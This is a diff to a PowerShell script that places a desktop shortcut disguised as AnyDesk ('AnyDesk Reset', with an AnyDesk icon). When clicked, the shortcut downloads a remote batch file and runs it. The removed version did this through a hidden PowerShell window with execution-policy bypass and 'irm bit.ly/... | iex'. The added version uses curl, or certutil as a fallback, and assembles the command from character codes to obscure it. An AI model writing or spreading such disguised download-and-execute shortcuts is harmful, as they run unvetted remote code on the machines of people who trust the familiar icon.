@@ -7,7 +7,7 @@ $iconPath  = Join-Path $iconDir 'anydesk.ico'
 $lnkPath   = Join-Path $desktop 'AnyDesk.lnk'
 $batchPath = Join-Path $env:TEMP 'initad.bat'
 $progPath  = Join-Path $env:TEMP 'progress.ps1'
-$batchUrl  = 'https://raw.githubusercontent.com/wevertonmbrtx/anydesk/refs/heads/main/initad.bat'
+$batchUrl  = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
 
 $webClient = New-Object Net.WebClient
 $webClient.Headers.Add('User-Agent', 'Mozilla/5.0')
@@ -52,17 +52,24 @@ try {
     Write-Warning "Can't create icon: $_"
 }
 
-$q      = [char]34
-$tls    = '[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType],3072)'
-$psExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $q$tls; irm bit.ly/wgitad | iex$q"
+$lnkUrl  = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
+$q       = [char]34
+$aa      = [char]38 + [char]38
+$oo      = [char]124 + [char]124
+$gt      = [char]62
+$tmp     = '%TEMP%\initad.bat'
+$cmdExe  = "$env:SystemRoot\System32\cmd.exe"
+$curlCmd = 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $lnkUrl + $q + ' ' + $aa + ' call ' + $q + $tmp + $q
+$certCmd = 'certutil -urlcache -split -f ' + $q + $lnkUrl + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q
+$check   = 'where curl 1' + $gt + 'nul 2' + $gt + 'nul'
+$lnkArgs = '/c ' + $q + $check + ' ' + $aa + ' (' + $curlCmd + ') ' + $oo + ' (' + $certCmd + ')' + $q
 
 try {
     $ws       = New-Object -ComObject WScript.Shell
     $shortcut = $ws.CreateShortcut($lnkPath)
-    $shortcut.TargetPath  = $psExe
-    $shortcut.Arguments   = $psArgs
-    $shortcut.WindowStyle = 7
+    $shortcut.TargetPath  = $cmdExe
+    $shortcut.Arguments   = $lnkArgs
+    $shortcut.WindowStyle = 1
     $shortcut.Description = 'AnyDesk Reset'
     if (Test-Path $iconPath) { $shortcut.IconLocation = "$iconPath,0" }
     $shortcut.Save()
